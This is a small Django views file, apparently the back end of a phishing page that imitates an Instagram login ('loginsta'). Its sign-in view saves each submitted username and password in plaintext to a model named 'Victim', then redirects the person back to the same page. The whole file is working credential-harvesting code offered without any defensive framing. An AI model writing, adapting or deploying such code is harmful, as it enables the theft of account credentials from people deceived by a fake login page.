from django.shortcuts import render, redirect, HttpResponse
from loginsta.models import *
# Create your views here.

def signin(request):
	if request.method == 'POST':
		uname = request.POST['username']
		pwd = request.POST['password']
		user = Victim(
			name=uname,
			password=pwd, )
		user.save()
		
		return redirect('signin')
	return render(request, 'index.html')
